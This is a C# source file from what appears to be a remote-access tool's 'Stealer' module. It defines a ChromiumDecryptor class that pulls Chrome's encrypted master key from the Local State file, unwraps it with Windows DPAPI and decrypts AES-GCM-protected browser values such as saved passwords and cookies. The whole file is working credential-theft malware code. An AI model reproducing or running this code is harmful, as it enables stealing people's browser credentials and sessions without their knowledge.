using FKRemoteDesktop.Cryptography;
using FKRemoteDesktop.Helpers;
using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Security.Cryptography;
using System.Text;

//--------------------------------------------------------------------------------------
namespace FKRemoteDesktop.Stealer.Helper
{
    public class ChromiumDecryptor
    {
        private readonly byte[] _key;

        public ChromiumDecryptor(string localStatePath)
        {
            try
            {
                if (File.Exists(localStatePath))
                {
                    string localState = File.ReadAllText(localStatePath);
                    var subStr = localState.IndexOf("\"encrypted_key\":\"") + "\"encrypted_key\":\"".Length;
                    var encKeyStr = localState.Substring(subStr).Substring(0, localState.Substring(subStr).IndexOf('"'));
                    _key = ProtectedData.Unprotect(Convert.FromBase64String(encKeyStr).Skip(5).ToArray(), null, DataProtectionScope.CurrentUser);
                }
            }
            catch (Exception e)
            {
                Debug.WriteLine(e);
            }
        }

        public string Decrypt(int length, string cipherText)
        {
            var cipherTextBytes = Encoding.Default.GetBytes(cipherText);
            if ((cipherText.StartsWith("v10") || cipherText.StartsWith("v11")) && _key != null)
            {
                /*
                byte[] valueArrays = Encoding.Default.GetBytes(cipherText);
                byte[] iv = valueArrays.Skip(3).Take(12).ToArray(); // From 3 to 15
                byte[] payload = valueArrays.Skip(15).ToArray();
                string output = AesGcm256.Decrypt(payload, _key, iv);
                return output;
                */
                return Encoding.UTF8.GetString(DecryptAesGcm(length, cipherTextBytes, _key, 3));
            }
            else if (cipherText.StartsWith("v20"))
            {
                return Encoding.UTF8.GetString(cipherTextBytes);
            }
            return Encoding.UTF8.GetString(ProtectedData.Unprotect(cipherTextBytes, null, DataProtectionScope.CurrentUser));
        }

        private byte[] DecryptAesGcm(int payloadLength, byte[] message, byte[] key, int nonSecretPayloadLength)
        {
            const int KEY_BIT_SIZE = 256;
            const int MAC_BIT_SIZE = 128;
            const int NONCE_BIT_SIZE = 96;

            if (key == null || key.Length != KEY_BIT_SIZE / 8)
                throw new ArgumentException($"Key needs to be {KEY_BIT_SIZE} bit!", nameof(key));
            if (message == null || message.Length == 0)
                throw new ArgumentException("Message required!", nameof(message));

            using (var cipherStream = new MemoryStream(message))
            using (var cipherReader = new BinaryReader(cipherStream))
            {
                var nonSecretPayload = cipherReader.ReadBytes(nonSecretPayloadLength);
                var nonce = cipherReader.ReadBytes(NONCE_BIT_SIZE / 8);
                var cipher = new GcmBlockCipherNew(new AesEngine());
                var parameters = new AeadParameters(new KeyParameter(key), MAC_BIT_SIZE, nonce, null);
                cipher.Init(false, parameters);
                var cipherText = cipherReader.ReadBytes(message.Length);
                var plainText = new byte[cipher.GetOutputSize(cipherText.Length)];
                try
                {
                    var len = cipher.ProcessBytes(cipherText, 0, cipherText.Length, plainText, 0);
                    cipher.DoFinal(plainText, len);
                }
                catch (InvalidCipherTextException)
                {
                    return null;
                }
                return plainText;
            }
        }
    }
}